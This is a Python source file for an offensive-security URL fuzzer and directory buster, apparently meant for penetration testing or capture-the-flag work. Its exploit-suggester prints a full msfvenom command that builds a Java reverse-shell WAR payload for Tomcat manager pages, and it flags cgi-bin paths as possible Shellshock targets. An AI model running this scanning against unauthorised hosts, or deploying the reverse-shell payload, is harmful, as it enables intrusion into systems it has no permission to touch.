import argparse
import concurrent.futures
import os
import re
from typing import TextIO, Tuple

import requests

headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) '
                  'Chrome/60.0.3112.113 Safari/537.36 '
}


def format_url(url: str, keyword: str) -> int | str:
    """Returns a formatted URL to fuzz/directory bust."""
    try:
        if re.search("FUZZ", url):
            url = url.replace("FUZZ", keyword.strip())
        else:
            print("[!] Could not find the \"FUZZ\" string. E.g. \"https://www.google.com/q?=FUZZ\"")
            return 0

    except Exception as e:
        print(e)

    return url


def prepare_wordlist(url: str, wordlist: TextIO) -> Tuple[list, list, int]:
    """Returns valid URLs, a total of all words, and a list of invalid words discovered in the wordlist."""
    urls = []
    badwords = []

    try:
        file = open(wordlist, 'r')
    except Exception as e:
        print(e)

    try:
        for word in file:
            temp_url = format_url(url, word)
            if temp_url == 0:
                exit()
            urls.append(temp_url)
    except Exception as e:
        badwords.append(word)

    total_urls = len(urls)
    print(f"Total URLs to fuzz: {total_urls}")
    print(f"Total invalid words in wordlist: {len(badwords)}")

    return urls, badwords, total_urls


def exploit_suggester(url: str) -> str | None:
    """Takes a URL and determines if vulnerabilities might exist. Returns vulnerability notes."""
    if re.search("/cgi-bin/", url):
        return "└─[¿shellshock?] -> Scan for scripts in /cgi-bin/ (e.g. http://127.0.0.1/cgi-bin/FUZZ.sh)."
    if re.search(":8080/manager", url):
        return "└─[¿tomcat?] -> 'msfvenom -p java/shell_reverse_tcp lhost=10.10.10.10 lport=4444 -f war -o revshell.war'"
    return


# def process_files(url: str, extensions: list) -> str:
#     """Performs a GET request for the URI and returns a file status code."""
#     for extension in extensions:
#         res = requests.get(f"{url.strip()} + .{extension}", timeout=3, allow_redirects=False, headers=headers)


def process_url(url: str) -> str | None:
    """Performs a GET request for the URL and returns a page status code."""
    try:
        res = requests.get(url.strip(), timeout=3, allow_redirects=False, headers=headers)
        match res.status_code:
            case 200:
                if re.search("Error 404", res.text):
                    return None
                if re.search("status=404", res.text) and re.search("Whitelabel Error Page", res.text):
                    # Spring boot 404 with default content
                    return None
                if exploit_suggester(url) != None:
                    return f"Discovered: {url}\n{exploit_suggester(url)}"
                else:
                    return f"Discovered: {url}"
            case 301:
                if exploit_suggester(url) != None:
                    return f"Temporary redirect: {url}\n{exploit_suggester(url)}"
                else:
                    return f"Temporary redirect: {url}"
            case 302:
                if exploit_suggester(url) != None:
                    return f"Permanent redirect: {url}\n{exploit_suggester(url)}"
                else:
                    return f"Permanent redirect: {url}"
            case 403:
                if exploit_suggester(url) != None:
                    return f"Forbidden: {url}\n{exploit_suggester(url)}"
                else:
                    return f"Forbidden: {url}"
            case 500:
                return None
            case _:
                pass

    except Exception as e:
        # Error on subdomain does not exist
        # print(f"{e}")
        return "Invalid URL"


def fuzz(url: str, wordlist: TextIO) -> None:
    """Concurrent processing. Returns nothing."""
    urls = prepare_wordlist(url, wordlist)
    i = 0

    with concurrent.futures.ThreadPoolExecutor(max_workers=50) as executor:
        futures = []

        for url in urls[0]:
            futures.append(executor.submit(process_url, url=url))

        try:
            for future in concurrent.futures.as_completed(futures):

                res = future.result()

                if res != "Invalid URL" and res is not None:
                    print(f"{res}")
                    i += 1

                i += 1
                print(f"{i} of {len(urls[0])}", end="\r")

        except Exception as e:
            i += 1

    print(f"Did not process: {urls[1]}")


def main() -> None:
    parser = argparse.ArgumentParser(description='URL Fuzzer (E.g. ')
    parser.add_argument('-u', '--url', required=True, type=str,
                        default=None, dest="url",
                        help="Specify URL to fuzz (e.g. www.google.com?q=FUZZ")
    parser.add_argument('-w', '--wordlist', required=True, type=str,
                        default=None,
                        help='Specify wordlist to use (e.g. /usr/share/wordlists/dirb/commmon.txt)')

    args = parser.parse_args()

    if args.url is not None:
        url = args.url

    if (args.wordlist is not None) and (os.path.isfile(args.wordlist)):
        wordlist = args.wordlist
    else:
        print(f"[!] Invalid wordlist")
        exit(0)

    fuzz(url, wordlist)


if __name__ == '__main__':
    main()
